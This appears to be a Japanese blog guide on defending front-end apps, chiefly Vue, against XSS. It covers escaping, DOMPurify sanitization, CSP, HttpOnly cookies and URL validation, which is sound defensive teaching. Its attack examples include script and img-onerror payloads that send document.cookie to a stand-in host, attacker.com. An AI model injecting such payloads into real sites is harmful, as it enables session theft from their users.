---
title: "フロントエンドセキュリティ：XSS 防御ガイド"
date: 2018-03-08 10:50:19
tags:
  - セキュリティ
readingTime: 4
description: "XSS（Cross-Site Scripting）は最も一般的なフロントエンドセキュリティ脆弱性の一つです。この記事では攻撃の仕組みから防御策まで体系的に整理します。"
---

XSS（Cross-Site Scripting）は最も一般的なフロントエンドセキュリティ脆弱性の一つです。この記事では攻撃の仕組みから防御策まで体系的に整理します。

## XSS の 3 つの種類

### 蓄積型 XSS

攻撃者が悪意あるスクリプトをデータベースに保存し、他のユーザーがアクセスしたときに実行される：

```
攻撃者がコメントを投稿：<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

サーバーがデータベースに保存
↓
他のユーザーがコメント一覧を読み込む
↓
ブラウザがスクリプトを実行し、攻撃者のサーバーに cookie を送信
```

そのページにアクセスした全ユーザーが影響を受けるため、最も危険です。

### 反射型 XSS

悪意あるスクリプトが URL に埋め込まれ、ユーザーがクリックするよう誘導される：

```
通常の URL：https://example.com/search?q=フロントエンド
悪意ある URL：https://example.com/search?q=<script>alert(document.cookie)</script>

サーバーが q パラメーターを HTML に直接埋め込む：
<p>検索結果：<script>alert(document.cookie)</script></p>
```

### DOM 型 XSS

攻撃がクライアントサイドで発生し、サーバーを経由しない：

```javascript
// 危険なコード：URL パラメーターを直接 DOM に挿入
const query = location.search.substring(1);
document.getElementById("result").innerHTML = "検索：" + query;

// 攻撃 URL：?<img src=x onerror=alert(document.cookie)>
```

## 防御策

### 1. 出力エンコーディング（基本中の基本）

ユーザー入力を直接 HTML に挿入してはいけません。エスケープ関数を使います：

```javascript
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// 使用例
element.textContent = userInput; // ✅ 安全、ブラウザが自動エスケープ
element.innerHTML = escapeHTML(userInput); // ✅ 手動エスケープ

element.innerHTML = userInput; // ❌ 危険！
```

Vue の `{{ }}` テンプレート補間はテキストコンテンツを自動的にエスケープするため、デフォルトで安全です：

```vue
{% raw %}
<template>
  <!-- ✅ 安全：自動エスケープ -->
  <p>{{ userComment }}</p>

  <!-- ❌ 危険：v-html はエスケープしない -->
  <p v-html="userComment"></p>
</template>
{% endraw %}
```

### 2. v-html の安全な使い方

リッチテキストなど HTML のレンダリングが必要な場合は、必ずサニタイズしてから使います：

```javascript
import DOMPurify from "dompurify";

// 許可するタグと属性を設定
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target"],
});
```

```vue
<p v-html="sanitizedContent"></p>
```

### 3. CSP（コンテンツセキュリティポリシー）

HTTP レスポンスヘッダーでブラウザに許可するリソースの取得元を指定する：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-xxx';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com
```

XSS コードが注入されても、CSP の制限により悪意あるスクリプトの読み込みや実行をブロックできます。

Nginx の設定：

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'";
```

### 4. HttpOnly Cookie

セッショントークンを HttpOnly に設定することで、JavaScript からの読み取りを防ぐ：

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

XSS が発生しても、攻撃者は `document.cookie` でトークンを盗めません。

### 5. 入力バリデーション

フロントエンドのバリデーションはあくまで補助であり、本当のバリデーションはサーバーサイドで行う必要があります。ただし、フロントエンドでも以下を行うべきです：

```javascript
// リッチテキストエディター：許可する HTML タグを制限
// URL パラメーター：フォーマットを検証し、javascript: プロトコルを拒否
function isSafeURL(url) {
  try {
    const parsed = new URL(url);
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// ❌ javascript:alert(1)  → 拒否される
// ✅ https://example.com   → 許可される
```

## 実際のインシデント事例

**事例：検索ボックスの反射型 XSS**

```vue
<!-- ❌ URL パラメーターを v-html で直接表示、エスケープなし -->
<template>
  <p v-html="'検索：' + $route.query.keyword"></p>
</template>
```

攻撃 URL：`?keyword=<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`

修正：

```vue
{% raw %}
<!-- ✅ テキスト補間を使う — 自動エスケープ -->
<template>
  <p>検索：{{ $route.query.keyword }}</p>
</template>
{% endraw %}
```

## 防御チェックリスト

- [ ] `innerHTML` は使わず、`textContent` を優先する
- [ ] Vue での `v-html` は慎重に使い、必ず先にサニタイズする
- [ ] サーバーサイドですべての出力を HTML エスケープする
- [ ] CSP レスポンスヘッダーを設定する
- [ ] セッション cookie に `HttpOnly` + `Secure` を設定する
- [ ] URL パラメーターを使う前にプロトコルを検証する

## まとめ

XSS 防御の核心原則：**ユーザー入力を絶対に信頼せず**、出力時は常にエスケープする。CSP と HttpOnly は追加の防御層であり、万が一の際の被害を抑制します。
